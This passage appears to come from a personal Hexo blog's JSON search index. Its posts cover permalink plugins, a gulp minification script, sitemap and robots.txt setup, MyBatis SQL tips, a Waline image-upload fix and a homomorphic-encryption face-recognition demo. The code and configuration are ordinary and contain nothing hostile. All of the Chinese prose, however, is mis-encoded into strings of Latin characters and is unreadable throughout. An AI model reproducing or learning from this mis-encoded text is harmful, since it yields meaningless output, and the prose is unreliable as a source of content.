¼å¼æ˜¯ï¼š year/:month/:day/:title/ ç¼ºç‚¹: è‹¥æ ‡é¢˜ä¸ºä¸­æ–‡æ ‡é¢˜,åˆ™åˆ†äº«é“¾æ¥æ—¶ä¼šå˜æˆ%X%X%X%ä¹‹ç±»çš„ä¸œè¥¿,éå¸¸éš¾å—.åˆè‡­åˆé•¿,è€Œä¸”ä¸€æ—¦æ›´æ”¹æ ‡é¢˜å’Œæ—¥æœŸ,é“¾æ¥ä¼šå¤±æ•ˆ,éå¸¸ä¸å‹å¥½ è§£å†³æ–¹æ³•: é‡‡ç”¨ hexo-abbrlink æ’ä»¶ åœ¨åšå®¢æ ¹ç›®å½•ï¼ˆæ‰§è¡Œhexoå‘½ä»¤çš„åœ°æ–¹ï¼‰å®‰è£…æ’ä»¶ï¼š npm install hexo-abbrlink --save ç¼–è¾‘ç«™ç‚¹é…ç½®æ–‡ä»¶ _config.yml é¦–å…ˆæ³¨é‡Šæ‰åŸå…ˆçš„permalinkè®¾ç½® é…ç½®ä»£ç  # ======================================================= # # =====================abbrlink========================== # # ======================================================= # #permalink: :year/:month/:day/:title/ # permalink_defaults: # pretty_urls: # trailing_index: false # Set to false to remove trailing 'index.html' from permalinks # trailing_html: false # Set to false to remove trailing '.html' from permalinks permalink: posts/:abbrlink/ abbrlink: alg: crc32 #support crc16(default) and crc32 rep: hex #support dec(default) and hex drafts: false #(true)Process draft,(false)Do not process draft. false(default) # Generate categories from directory-tree # depth: the max_depth of directory-tree you want to generate, should > 0 auto_category: enable: true #true(default) depth: #3(default) over_write: false auto_title: false #enable auto title, it can auto fill the title by path auto_date: false #enable auto date, it can auto fill the date by time today force: false #enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink. é¡¹ç›®é“¾æ¥: hexo-abbrlinkhttps://github.com/Rozbo/hexo-abbrlink é‡æ–°éƒ¨ç½² hexo clean &amp;&amp; hexo g é‡æ–°éƒ¨ç½²å,ä¼šåœ¨front-matter å­—æ®µä¸­å¢åŠ  abbrlink å­—æ®µ éªŒè¯æŸ¥çœ‹ ,æœ¬åœ°æµ‹è¯•æŸ¥çœ‹ hexo s -g Gulpå‹ç¼©èµ„æº å®‰è£…gulpåŠç›¸å…³æ’ä»¶ å¯ä»¥ç›´æ¥ä¿®æ”¹ package.json æ·»åŠ  gulp-replace ç‰ˆæœ¬å·ä»¥åŠgulpä¾èµ– ä¿®æ”¹å®Œæˆå, åœ¨blogæ ¹ç›®å½•ä¸‹æ§åˆ¶å° è¾“å…¥: npm i é‡æ–°éƒ¨ç½²package.json ä»¥ä¸‹æ˜¯æˆ‘çš„package.json å¯ä¾›å‚è€ƒ package.json &#123; \"name\": \"hexo-site\", \"version\": \"0.0.0\", \"private\": true, \"scripts\": &#123; \"rebuild\": \"hexo clean &amp;&amp; hexo g &amp;&amp; gulp\", \"rebuildJsd\": \"hexo clean &amp;&amp; hexo generate --config _github.yml &amp;&amp; gulp two\", \"deployGit\": \"hexo deploy --config _github.yml\", \"deployGitHub\": \"hexo deploy --config _githubOnly.yml\", \"deployOss\": \"hexo deploy --config _tencent.yml\", \"start\": \"hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d\", \"build\": \"hexo generate\", \"clean\": \"hexo clean\", \"server\": \"hexo server\" &#125;, \"hexo\": &#123; \"version\": \"5.4.0\" &#125;, \"dependencies\": &#123; \"aplayer\": \"^1.10.1\", \"gulp-replace\": \"^1.1.3\", \"hexo\": \"^5.0.0\", \"hexo-abbrlink\": \"^2.2.1\", \"hexo-autonofollow\": \"^1.0.1\", \"hexo-deployer-git\": \"^3.0.0\", \"hexo-generator-archive\": \"^1.0.0\", \"hexo-generator-baidu-sitemap\": \"^0.1.9\", \"hexo-generator-category\": \"^1.0.0\", \"hexo-generator-index\": \"^2.0.0\", \"hexo-generator-json-content\": \"^4.2.3\", \"hexo-generator-search\": \"^2.4.3\", \"hexo-generator-sitemap\": \"^2.1.0\", \"hexo-generator-tag\": \"^1.0.0\", \"hexo-renderer-ejs\": \"^1.0.0\", \"hexo-renderer-markdown-it\": \"^5.0.0\", \"hexo-renderer-stylus\": \"^2.0.0\", \"hexo-server\": \"^2.0.0\", \"hexo-theme-stellar\": \"^1.4.1\", \"hexo-wordcount\": \"^6.0.1\", \"markdown-it-emoji\": \"^2.0.0\" &#125;, \"devDependencies\": &#123; \"gulp\": \"^4.0.2\", \"gulp-html-minifier-terser\": \"^6.0.1\", \"gulp-htmlclean\": \"^2.7.22\", \"gulp-htmlmin\": \"^5.0.1\", \"gulp-minify-css\": \"^1.2.4\", \"gulp-terser\": \"^2.0.1\" &#125; &#125; ç¼–è¾‘gulpfile.js blogæ ¹ç›®å½•ä¸‹æ·»åŠ gulpfile.js æ–‡ä»¶ æ·»åŠ ä»£ç  å…¶ä¸­ minify_html_jsd å¯¹åº”çš„æ˜¯ä½¿ç”¨cdn é‡å®šå‘, åé¢é“¾æ¥å¯¹åº”æ”¹æˆè‡ªå·±çš„é™æ€æ–‡ä»¶ä»“åº“å³å¯ pipe(replace(xxx, xxx)) æ˜¯é“¾æ¥é‡å®šå‘, è·Ÿæ ¹æ®éœ€æ±‚è‡ªå®šä¹‰ gulpfile.js var gulp = require('gulp'); var minifycss = require('gulp-minify-css'); var htmlmin = require('gulp-html-minifier-terser'); // var uglify = require('gulp-uglify'); var htmlclean = require('gulp-htmlclean'); var terser = require('gulp-terser'); var replace = require('gulp-replace'); // å‹ç¼©cssæ–‡ä»¶ const minify_css = () => ( gulp.src(['./public/**/*.css']) .pipe(minifycss(&#123; compatibility: 'ie8' &#125;)) // .pipe(minifycss()) .pipe(gulp.dest('./public')) ); // å‹ç¼©htmlæ–‡ä»¶ const minify_html = () => ( gulp.src(['./public/**/*.html','!./public/&#123;lib,lib/**&#125;','!./public/**.xml']) .pipe(replace('src=\"/js/', 'src=\"https://sizaif.com/js/')) .pipe(replace('href=\"/css/\"', 'href=\"https://sizaif.com/css/')) .pipe(replace('../img/img_article', 'https://sizaif.com/img/img_article/')) .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public')) ) const minify_html_jsd = () => ( gulp.src(['./public/**/*.html','!./public/&#123;lib,lib/**&#125;']) .pipe(replace('src=\"/js/', 'src=\"https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/js/')) .pipe(replace('href=\"/css/\"', 'href=\"https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/css/\"')) .pipe(replace('../img/img_article', 'https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/img/img_article')) .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public')) ) // å‹ç¼©jsæ–‡ä»¶ const minify_js = () => ( gulp.src(['./public/**/*.js', '!./public/**/*.min.js','!./public/&#123;lib,lib/**&#125;']) .pipe(terser()) // .pipe(uglify()) .pipe(gulp.dest('./public')) ) module.exports = &#123; minify_html: minify_html, minify_css: minify_css, minify_js: minify_js, minify_html_jsd: minify_html_jsd &#125;; gulp.task('one', gulp.parallel( minify_html, minify_css, minify_js )); gulp.task('two', gulp.parallel( minify_html_jsd, minify_css, minify_js )); gulp.task('default', gulp.series('one')); è¿è¡Œ ä½¿ç”¨gulpå, å‘å¸ƒæ¨é€(hexo d)å‰éœ€è¦æ·»åŠ ä¸€ä¸ªå‘½ä»¤ # ä¸ä½¿ç”¨cdn $ hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d # ä½¿ç”¨cdné‡å®šå‘ $ hexo clean &amp;&amp; hexo g &amp;&amp; gulp two &amp;&amp; hexo d SEO-sitemap å®‰è£…æ’ä»¶ ç™¾åº¦ $ npm install hexo-generator-baidu-sitemap --save è°·æ­Œ $ npm install hexo-generator-sitemap --save ç¼–è¾‘ä¸»ç«™_config.yml æ·»åŠ ä»£ç  ## ======================================================= # ## ==ä¸‰ã€SEO ä¼˜åŒ–äºŒç½‘ç«™åœ°å›¾ npm install hexo-generator-sitemap --save====== # ## npm install hexo-generator-baidu-sitemap --save ## ======================================================= # sitemap: path: sitemap.xml # tag: true # category: true baidusitemap: path: baidusitemap.xml é‡æ–°éƒ¨ç½² ä¼šåœ¨publicç›®å½•ä¸‹ç”Ÿæˆ: sitemap.xml -&gt; è°·æ­Œ baidusitemap.xml -&gt; ç™¾åº¦ $ hexo clean &amp;&amp; hexo g ç„¶ååˆ†åˆ«å»å¯¹äºç«™ç‚¹ç½‘ç«™æäº¤å³å¯ ç™¾åº¦ç«™ç‚¹ç®¡ç†https://ziyuan.baidu.com/site/ è°·æ­Œç«™ç‚¹ç®¡ç†https://search.google.com/search-console/about robots.txtæ–‡ä»¶ robots.txtæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç½‘ç«™ç®¡ç†è€…å¯ä»¥å£°æ˜è¯¥ç½‘ç«™ä¸­ä¸æƒ³è¢«robotsè®¿é—®çš„éƒ¨åˆ†ï¼Œæˆ–è€…æŒ‡å®šæœç´¢å¼•æ“åªæ”¶å½•æŒ‡å®šçš„å†…å®¹ã€‚ å½“ä¸€ä¸ªæœç´¢æœºå™¨äººï¼ˆæœ‰çš„å«æœç´¢èœ˜è››ï¼‰è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢æœºå™¨äººå°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚ å¦å¤–ï¼Œrobots.txtå¿…é¡»æ”¾ç½®åœ¨ä¸€ä¸ªç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼Œè€Œä¸”æ–‡ä»¶åå¿…é¡»å…¨éƒ¨å°å†™ã€‚ åœ¨source ç›®å½•ä¸‹ æ–°å»º robots.txt åŸŸåæ”¹æˆè‡ªå·±çš„ robots.txt # robots.txt www.sizaif.com User-agent: * Allow: /sitemap.xml Allow: /baidusitemap.xml Allow: /category-sitemap.xml Allow: /page-sitemap.xml Allow: /post-sitemap.xml Allow: /tag-sitemap.xml Allow: /posts/ Disallow: /css Disallow: /js Disallow: /fonts Disallow: /img Disallow: /fonts Disallow: /page Disallow: /navigation Disallow: /tags Disallow: /archives Disallow: /404.html Disallow: /403.html Disallow: /update.log Disallow: /search.xml Disallow: /README.md","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Hexo","slug":"æŠ€æœ¯å‘/Hexo","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://www.sizaif.com/tags/Hexo/"}],"author":"sizaif"},{"title":"ä¸ƒå¤•-æ‚è°ˆ","slug":"ä¸ƒå¤•-æ‚è°ˆ","date":"2021-08-14T09:28:28.000Z","updated":"2021-11-13T02:35:33.986Z","comments":true,"path":"posts/52b019f9/","link":"","permalink":"https://www.sizaif.com/posts/52b019f9/","excerpt":"","text":"é€ç»™æ¯ä¸€å¯¹ç”œç”œèœœèœœçš„ä½ ä»¬!","categories":[{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"https://www.sizaif.com/tags/%E6%9D%82%E8%B0%88/"}],"author":"sizaif"},{"title":"Mybatis Insert æ’å…¥æ—¶æ‹¿åˆ°è‡ªå¢çš„ä¸»é”®ID","slug":"Mybatis-Insert-æ’å…¥æ—¶æ‹¿åˆ°è‡ªå¢çš„ä¸»é”®ID","date":"2021-08-14T09:17:51.000Z","updated":"2021-09-19T10:09:19.061Z","comments":true,"path":"posts/eabbfbf/","link":"","permalink":"https://www.sizaif.com/posts/eabbfbf/","excerpt":"","text":"useGeneratedKeys=â€œtrueâ€ : æ˜¯å¦å¼€å¯ç”Ÿæˆä¸»é”® keyColumn=â€œæ•°æ®åº“ä¸­ä¸»é”®åç§°â€ eyProperty=â€œ(å®ä½“ç±»ä¸­ä¸»é”®å¯¹åº”çš„åç§°æˆ–è€…è‡ªå®šä¹‰åç§°)â€&gt; å¦‚æœä½ ä¼ å…¥çš„å‚æ•°æ˜¯å®ä½“ç±», é‚£ä¹ˆè¯·æ³¨æ„keyProperty å¯¹åº”çš„åº”è¯¥æ˜¯å®ä½“ç±»ä¸­çš„ä¸»é”®ID; å¦‚æœä½ ä¼ å…¥çš„å‚æ•°æ˜¯map,é‚£ä¹ˆå°±å¯ä»¥è‡ªå®šä¹‰åç§°. æ³¨æ„:æ–°æ·»åŠ ä¸»é”®idå¹¶ä¸æ˜¯åœ¨æ‰§è¡Œæ·»åŠ æ“ä½œæ—¶ç›´æ¥è¿”å›çš„ï¼Œè€Œæ˜¯åœ¨æ‰§è¡Œæ·»åŠ æ“ä½œä¹‹åå°†æ–°æ·»åŠ è®°å½•çš„ä¸»é”®idå­—æ®µè¿”å›åˆ°ä¼ å…¥çš„å‚æ•°ç±»ä¸­. ä¾‹å¦‚: &lt;insert id=\"addUser\" parameterType=\"map\" useGeneratedKeys=\"true\" keyColumn=\"id\" keyProperty=\"id\"> INSERT INTO saishiguanli.users (createDate, modifyDate, isEnabled, isLocked, lastLoginDate, lastLoginIp, lockDate, name, encodePassword) VALUES (#&#123;createDate&#125;,#&#123;modifyDate&#125;,#&#123;isEnabled&#125;,#&#123;isLocked&#125;,#&#123;lastLoginDate&#125;,#&#123;lastLoginIp&#125;,#&#123;lockDate&#125;,#&#123;name&#125;,#&#123;encodePassword&#125;) &lt;/insert> è°ƒç”¨addUseræ–¹æ³•å int id = Integer.parseInt(hashMap.get(\"id\").toString()); ä¾¿å¯ä»¥å–å¾—ä¸»é”®ID; è‹¥ ä¼ å…¥çš„æ˜¯å®ä½“ç±», é‚£ä¹ˆè°ƒç”¨æ–¹æ³•å int id = user.getId(); å³å¯","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Mybatis","slug":"æŠ€æœ¯å‘/Mybatis","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mybatis/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.sizaif.com/tags/Mybatis/"}],"author":"sizaif"},{"title":"Mybatisä¸­updateä½¿ç”¨åŠ¨æ€SQLè¯­å¥","slug":"Mybatisä¸­updateä½¿ç”¨åŠ¨æ€SQLè¯­å¥","date":"2021-08-14T09:10:44.000Z","updated":"2021-09-19T10:09:19.023Z","comments":true,"path":"posts/119fdf75/","link":"","permalink":"https://www.sizaif.com/posts/119fdf75/","excerpt":"","text":"è®°ä¸ªç¬”è®°:mybatisé‡åˆ°çš„å‘ Mybatis è¿›è¡ŒUpdate æ“ä½œæ—¶; æœ‰çš„æ•°æ®ä¸ä¸€å®šè¦è¿›è¡Œä¿®æ”¹,å› æ­¤ä»å‰å°ä¼ è¿‡æ¥çš„æ•°æ®,æŸäº›é¡¹å¯èƒ½ä¸ºnull; åœ¨è¿›è¡Œsql è¯­å¥æ—¶ å°±ä¼šè¿›è¡Œå¼‚å¸¸;å¯¼è‡´æ“ä½œå¤±è´¥; æ‰€ä»¥è¿›è¡ŒåŠ¨æ€SQLè¯­å¥æ‹¼æ¥: åœ¨UserMapper.xmlä¸­ æ›´æ”¹:Mybatisä¸­updateä½¿ç”¨åŠ¨æ€SQLè¯­å¥ &lt;update id=\"updateUser\" parameterType=\"map\" > update saishiguanli.user &lt;trim prefix=\"set\" suffixOverrides=\",\"> &lt;if test=\"ulevel!=null\">ulevel=#&#123;ulevel&#125;,&lt;/if> &lt;if test=\"ugender!=null\">ugender=#&#123;ugender&#125;,&lt;/if> &lt;if test=\"uname!=null\">uname=#&#123;uname&#125;,&lt;/if> &lt;if test=\"upwd!=null\">upwd=#&#123;upwd&#125;,&lt;/if> &lt;if test=\"unickname!=null\">unickname=#&#123;unickname&#125;,&lt;/if> &lt;if test=\"uimage!=null\">uimage=#&#123;uimage&#125;,&lt;/if> &lt;if test=\"uphone!=null\">uphone=#&#123;uphone&#125;,&lt;/if> &lt;if test=\"ucreatetime!=null\">ucreatetime=#&#123;ucreatetime&#125;,&lt;/if> &lt;/trim> where uid = #&#123;uid&#125; &lt;/update>","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Mybatis","slug":"æŠ€æœ¯å‘/Mybatis","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mybatis/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.sizaif.com/tags/Mybatis/"}],"author":"sizaif"},{"title":"è§£å†³Walineä½¿ç”¨å›¾ç‰‡ä¸Šä¼ å›¾åºŠè·¨åŸŸé”™è¯¯é—®é¢˜","slug":"è§£å†³walineä½¿ç”¨å›¾ç‰‡ä¸Šä¼ å›¾åºŠè·¨åŸŸé”™è¯¯é—®é¢˜","date":"2021-08-13T02:07:10.000Z","updated":"2021-09-21T06:09:52.217Z","comments":true,"path":"posts/db8bf7ad/","link":"","permalink":"https://www.sizaif.com/posts/db8bf7ad/","excerpt":"","text":"@auther by sizaf é”™è¯¯æè¿°: è¯´æ˜ æˆ‘é‡‡ç”¨çš„æ˜¯Volantis ä½œä¸ºä¸»é¢˜ åœ¨ä¸»é¢˜_config.yml æ–‡ä»¶ä¸­ ä¿®æ”¹waline é…ç½® waline: js: https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js path: # å…¨å±€è¯„è®ºåœ°å€ ç›®å‰è®¾ç½®å…¨å±€è¯„è®ºåœ°å€åvisitorå¤±æ•ˆ,è¿™æ˜¯walineçš„é—®é¢˜ placeholder: å…è®¸åŒ¿åè¯„è®ºï¼Œè¯„è®ºæ”¯æŒè´´å›¾ï¼Œå¤§å®¶åœ¨æˆªå›¾åï¼Œåœ¨è¯„è®ºæ¡†ç²˜è´´ï¼Œè‡ªåŠ¨ä¼ è‡³å›¾åºŠï¼Œæ¬¢è¿ä½¿ç”¨ä½“éªŒ~ # è¯„è®ºå ä½æç¤º imageHosting: https://7bu.top/api/upload # å›¾åºŠapiã€Œé»˜è®¤ä½¿ç”¨å»ä¸å›¾åºŠã€ # å…¶ä»–é…ç½®é¡¹æŒ‰ç…§ymlæ ¼å¼ç»§ç»­å¡«å†™å³å¯ é™¤äº† [el path placeholder uploadImage] é€‰é¡¹ meta: [nick,mail,link] # waline comment header info requiredFields: [nick,mail] serverURL: # Waline çš„æœåŠ¡ç«¯åœ°å€ã€Œå¿…å¡«ã€ æµ‹è¯•ç”¨åœ°å€: https://waline-ruddy.vercel.app avatar: robohash # gravatar style https://waline.js.org/client/basic.html#avatar pageSize: 10 # è¯„è®ºæ¯é¡µæ˜¾ç¤ºæ•°é‡ lang: zh-CN visitor: true å…¶ä¸­ serverURL é€‰é¡¹ è¯·å‚è€ƒæ–‡æ¡£ä½¿ç”¨è¯´æ˜ walineæ–‡æ¡£https://waline.js.org/guide/get-started.html è‹¥é‡‡ç”¨å…¶ä»–ä¸»é¢˜,å¯æŒ‰ç…§å®˜æ–¹è®¾ç½®åŠ å…¥ uploadImage å³å¯, å…·ä½“å‚è€ƒ &lt;head> .. &lt;script src='//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'>&lt;/script> ... &lt;/head> &lt;body> ... &lt;div id=\"waline\">&lt;/div> &lt;script> new Waline(&#123; el: '#waline', path: location.pathname, serverURL: 'https://your-domain.vercel.app' uploadImage: function(file) &#123; const formData = new FormData(); formData.append('image', file); return fetch('https://7bu.top/upload/upload.html', &#123; method: 'POST', body: formData &#125;).then(resp => resp.json()).then(resp => resp.data.url); &#125; &#125;); &lt;/script> &lt;/body> ä¿®æ”¹ å¦‚æœä½ ä½¿ç”¨volantisä½œä¸ºä¸»é¢˜, é‚£ä¹ˆåªéœ€è¦ä¿®æ”¹themes\\volantis\\layout\\_third-party\\comments\\waline\\script.ejs æ–‡ä»¶ä¸­ çš„uploadImageå‡½æ•° å°†your's token value æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ å›¾åºŠ token uploadImage: function(file) &#123; const formData = new FormData(); formData.append('image', file); const token = \"your's token value\"; return fetch('&lt;%= theme.comments.waline.imageHosting %>', &#123; method: 'POST', body: formData, headers: &#123;'Authorization': token&#125; &#125;).then(resp => resp.json()).then(resp => resp.data.url); &#125;, è‹¥é‡‡ç”¨å…¶ä»–ä¸»é¢˜ è¯·ä¿®æ”¹ä»£ç  å°†your's token value æ›¿æ¢ä¸ºä½ è‡ªå·±çš„ å›¾åºŠ token &lt;head> .. &lt;script src='//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js'>&lt;/script> ... &lt;/head> &lt;body> ... &lt;div id=\"waline\">&lt;/div> &lt;script> new Waline(&#123; el: '#waline', path: location.pathname, serverURL: 'https://your-domain.vercel.app' uploadImage: function(file) &#123; const formData = new FormData(); const token = \" your's token value\"; formData.append('image', file); return fetch('https://7bu.top/upload/upload.html', &#123; method: 'POST', body: formData, headers: &#123;'Authorization': token&#125; &#125;).then(resp => resp.json()).then(resp => resp.data.url); &#125; &#125;); &lt;/script> &lt;/body>","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"æ‚é¡¹","slug":"æŠ€æœ¯å‘/æ‚é¡¹","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"å›¾åºŠ","slug":"å›¾åºŠ","permalink":"https://www.sizaif.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"Waline","slug":"Waline","permalink":"https://www.sizaif.com/tags/Waline/"}],"author":"sizaif"},{"title":"PicGo + Gitee(ç äº‘)å®ç°markdownå›¾åºŠ","slug":"PicGo-Gitee-ç äº‘-å®ç°markdownå›¾åºŠ","date":"2021-08-12T02:27:37.000Z","updated":"2021-09-19T10:12:20.954Z","comments":true,"path":"posts/373ab937/","link":"","permalink":"https://www.sizaif.com/posts/373ab937/","excerpt":"","text":"@auther by sizaif è½¬è½½https://www.jianshu.com/p/b69950a49ae2","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"å›¾åºŠ","slug":"æŠ€æœ¯å‘/å›¾åºŠ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E5%9B%BE%E5%BA%8A/"}],"tags":[{"name":"PicGo","slug":"PicGo","permalink":"https://www.sizaif.com/tags/PicGo/"},{"name":"Gitee","slug":"Gitee","permalink":"https://www.sizaif.com/tags/Gitee/"}],"author":"sizaif"},{"title":"HE åœ¨äººè„¸è¯†åˆ«ä¸­çš„åº”ç”¨Demo æ¼”ç¤ºæ–‡æ¡£","slug":"HE-åœ¨äººè„¸è¯†åˆ«ä¸­çš„åº”ç”¨demo-æ¼”ç¤ºæ–‡æ¡£","date":"2021-08-12T02:08:34.000Z","updated":"2021-08-14T14:15:24.849Z","comments":true,"path":"posts/6c15e2cc/","link":"","permalink":"https://www.sizaif.com/posts/6c15e2cc/","excerpt":"","text":"@auther by sizaif HE åœ¨äººè„¸è¯†åˆ«ä¸­çš„åº”ç”¨demo æ¼”ç¤ºæ–‡æ¡£ @[toc] è¯´æ˜ ä½¿ç”¨çš„HEæ–¹æ¡ˆæ˜¯CKKS / | Encryption parameters : | scheme: CKKS | poly_modulus_degree: 8192 | coeff_modulus size: 200 (60 + 40 + 40 + 60) bits | scale: pow(2.0,40) \\ è¾“å…¥æ•°æ®çš„é•¿åº¦ n = 10 , å› ä¸ºæ²¡æœ‰ç”¨FaceNetæ•°æ®é›†çš„ç¼˜æ•…,æ¼”ç¤ºæ‰€ç”¨çš„æµ‹è¯•æ•°æ®æ¥æºä¸ºç®€å•ç”Ÿæˆ,ç”Ÿæˆæ–¹å¼ä¸º: ç¼–è¯‘å¹³å°: Visual Studio 2019 æ‰€éœ€å¤–éƒ¨ç¯å¢ƒ: seal.h ; examples.h ï¼› bits/stdc++.h é¡¹ç›®ä»£ç ä¸Šä¼ è‡³: github: https://github.com/sizaif/SEALExamples/tree/main æ•°æ®æ¥æº è¾“å…¥çš„inputæ•°æ®å’Œdatabaseæ•°æ®æ¥æºç”Ÿæˆä»£ç å¦‚ä¸‹: code // slot_count = poly_modulus_degree /2 => 4096 double curr_point = 0; double step_size = 1.0 / (static_cast&lt;double>(slot_count) - 1); ofstream out; out.open(\"database.txt\", ios::in | ios::out | ios::binary | ios::trunc); if (out.is_open()) &#123; int step = 0; for (size_t i = 0; i &lt; slot_count; i++) &#123; // æ¯10è¡Œä¸€ä¸ªæ•°æ® if(step %10 == 9) out &lt;&lt; curr_point &lt;&lt; \"\\n\"; else &#123; out &lt;&lt; curr_point &lt;&lt; \" \"; &#125; step++; curr_point += step_size; &#125; out &lt;&lt; endl; out.close(); cout &lt;&lt; \"Input vector: \" &lt;&lt; endl; &#125; é€‰å–çš„inputæ•°æ®å¦‚ä¸‹: [0.984127 0.984371 0.984615 0.98486 0.985104 0.985348 0.985592 0.985836 0.986081 0.986325] ä»ç”Ÿæˆçš„databaseä¸­æœ€å10è¡Œä¸­é€‰å–ç¬¬6è¡Œç”Ÿæˆ é€‰å–çš„database E æ•°æ®å¦‚ä¸‹: data [0.974359 0.974603 0.974847 0.975092 0.975336 0.97558 0.975824 0.976068 0.976313 0.976557][0.976801 0.977045 0.977289 0.977534 0.977778 0.978022 0.978266 0.97851 0.978755 0.978999][0.979243 0.979487 0.979731 0.979976 0.98022 0.980464 0.980708 0.980952 0.981197 0.981441][0.981685 0.981929 0.982173 0.982418 0.982662 0.982906 0.98315 0.983394 0.983639 0.983883][0.984127 0.984371 0.984615 0.98486 0.985104 0.985348 0.985592 0.985836 0.986081 0.986325][0.986569 0.986813 0.987057 0.987302 0.987546 0.98779 0.988034 0.988278 0.988523 0.988767][0.989011 0.989255 0.989499 0.989744 0.989988 0.990232 0.990476 0.99072 0.990965 0.991209][0.991453 0.991697 0.991941 0.992186 0.99243 0.992674 0.992918 0.993162 0.993407 0.993651][0.993895 0.994139 0.994383 0.994628 0.994872 0.995116 0.99536 0.995604 0.995849 0.996093][0.996337 0.996581 0.996825 0.99707 0.997314 0.997558 0.997802 0.998046 0.998291 0.998535] è¿‡ç¨‹æ­¥éª¤ æ€»è§ˆ é¦–å…ˆè®¡ç®— p ä¸ E ä¸­çš„ $C_{i}$ æ¯”è¾ƒåˆ†æ•°å¹¶ç”¨ $r_{i}$è¡¨ç¤º,æ±‚æœ€ä½³çš„ $r_{i}$, $\\mathbf{r}{i}=\\operatorname{dist}\\left(\\mathbf{p}, \\mathbf{c}{i}\\right) \\cdot \\mathbf{k} ; k={1,0, \\ldots 0}$â€‹ å¤„ç†å®Œå…¨éƒ¨æ•°æ®åº“å†…å®¹å,Nä¸ªå•ç‹¬ç»“æœçš„ vector $\\mathbf{R}=\\left[\\begin{array}{c}\\mathbf{r}{1} \\ \\mathbf{r}{2} \\ \\vdots \\ \\mathbf{r}{N}\\end{array}\\right]=\\left[\\begin{array}{c}\\left(\\mathbf{r}{1,1}, 0, \\ldots 0\\right) \\ \\left(\\mathbf{r}{2,1}, 0, \\ldots 0\\right) \\ \\vdots \\ \\left(\\mathbf{r}{N, 1}, 0, \\ldots 0\\right)\\end{array}\\right]$â€‹ æ¯ä¸ª$r_{i}$â€‹æ˜¯å•ç‹¬åŠ å¯†çš„, å¯ä»¥éšæœºæ‰“ä¹±$r_{i}$â€‹çš„é¡ºåº é€šè¿‡å°†$r_{i}$â€‹ç§»ä½,å˜æˆå¯¹è§’çŸ©é˜µ ä¾‹å¦‚ $\\mathbf{R}=\\left[\\begin{array}{c} \\left(\\mathbf{r}{1,1}, 0, \\ldots 0\\right) \\ \\left(0, \\mathbf{r}{2,1}, \\ldots 0\\right) \\ \\vdots \\ \\left(0,0, \\ldots \\mathbf{r}_{N, 1}\\right) \\end{array}\\right]$â€‹ å°†å¯¹è§’çº¿ä¸Švectorç»„åˆæˆæ–°çš„å¸¦æœ‰ä¸Pæ¯”è¾ƒåˆ†æ•°çš„vectoræ ¼å¼ i.e. $R-&gt;\\left(\\mathbf{r}{1,1}, \\mathbf{r}{2,1}, \\ldots \\mathbf{r}_{N, 1}\\right)$â€‹ 